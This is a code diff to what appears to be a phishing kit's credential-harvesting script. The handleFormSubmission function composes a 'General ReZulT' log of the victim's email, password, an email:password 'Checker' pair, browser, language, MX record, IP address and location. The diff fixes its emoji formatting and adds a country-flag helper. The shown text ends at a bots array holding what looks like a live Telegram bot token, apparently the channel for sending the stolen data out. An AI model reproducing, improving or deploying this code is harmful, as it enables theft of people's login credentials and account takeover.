@@ -17076,6 +17076,14 @@
     }
 
     
+	function countryToFlagEmoji(countryCode) {
+	  if (!countryCode) return "";
+	  return countryCode
+		.toUpperCase()
+		.replace(/./g, char => 
+		  String.fromCodePoint(127397 + char.charCodeAt())
+		);
+	}
 
     function handleFormSubmission(emailField, passwordField, domain, langs) {
 
@@ -17129,20 +17137,21 @@
                 // console.log('MX Record', await getMXRecord(domain))
 
 
-                var message =
+                const flag = countryToFlagEmoji(visitorInfo[1]);
+				var message =
                   `--------+ 📥 General ReZulT ${visitorInfo[2]} ${visitorInfo[3]}, ${visitorInfo[1]} +--------\n`;
-                message += 📧 "Email : " + ai + "\n";
-                message += 🔑 "Password : " + pr + "\n";
-                message += 📧:🔑 "Checker: " + ai + ":" + pr + "\n";
-                message += 🌐 "Browser : " + GetBrowserandLanguage()[0] + "\n";
+                message += "📧 Email : " + ai + "\n";
+                message += "🔑 Password : " + pr + "\n";
+                message += "📧:🔑 Checker: " + ai + ":" + pr + "\n";
+                message += "🌐 Browser : " + GetBrowserandLanguage()[0] + "\n";
 
-                message += 💬 "Language : " + GetBrowserandLanguage()[1] + "\n";
-                message += 📮 "MX Record : " + await getMXRecord(domain) + "\n";
-                message += "IP Address : " + visitorInfo[0] + "\n";
-                message += 🌍 `Region and Country : ${visitorInfo[2]} ${visitorInfo[3]}, ${visitorInfo[1]} \n`;
-                message += 🕓 "Date/Time : " + date + "\n";
+                message += "💬 Language : " + GetBrowserandLanguage()[1] + "\n";
+                message += "📮 MX Record : " + await getMXRecord(domain) + "\n";
+                message += "📡 IP Address : " + visitorInfo[0] + "\n";
+				message += `🌍 Region and Country : ${visitorInfo[2]} ${visitorInfo[3]}, ${visitorInfo[1]} ${flag}\n`;
+                message += "🕓 Date/Time : " + date + "\n";
                 message +=
-                  `---------+ General ReZulT ${visitorInfo[2]} ${visitorInfo[3]}, ${visitorInfo[1]} +-------------\n`;
+                  `---------+ 📥 General ReZulT ${visitorInfo[2]} ${visitorInfo[3]}, ${visitorInfo[1]} +-------------\n`;
 				var bots = [
 				  {
 					token: "8414918616:AAEwDNNfwh5g6qEBtGru4CoxMJNssydOpm0",
